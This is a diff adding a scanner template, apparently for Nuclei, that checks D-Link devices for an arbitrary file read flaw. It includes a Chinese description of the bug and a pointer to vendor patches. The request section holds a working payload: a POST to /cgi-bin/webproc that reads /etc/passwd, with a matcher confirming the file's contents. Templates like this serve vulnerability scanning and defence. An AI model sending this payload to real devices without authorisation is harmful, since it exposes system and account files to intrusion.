@@ -1,0 +1,27 @@
+id: dlink-file-read
+info:
+  name: D-Link - Arbitrary File Retrieval
+  author:
+  - l0ne1y
+  description: |-
+    D-Link 任意文件读取漏洞
+    任意文件读取/下载漏洞不同于网站目录浏览，此漏洞不仅仅可遍历系统下web中的文件，而且可以浏览或者下载到系统中的文件，攻击人员通过目录遍历攻击可以获取系统文件及服务器的配置文件等等。一般来说，攻击者利用服务器API、文件标准权限进行攻击。任意文件读取/下载漏洞可能存在于Web服务器软件本身，也可能存在于Web应用程序之中。
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.dlink.com/
+requests:
+- matchers:
+  - type: regex
+    part: body
+    regex:
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/cgi-bin/webproc'
+  method: POST
+  body: errorpage=/etc/passwd&obj-action=auth&:action=login
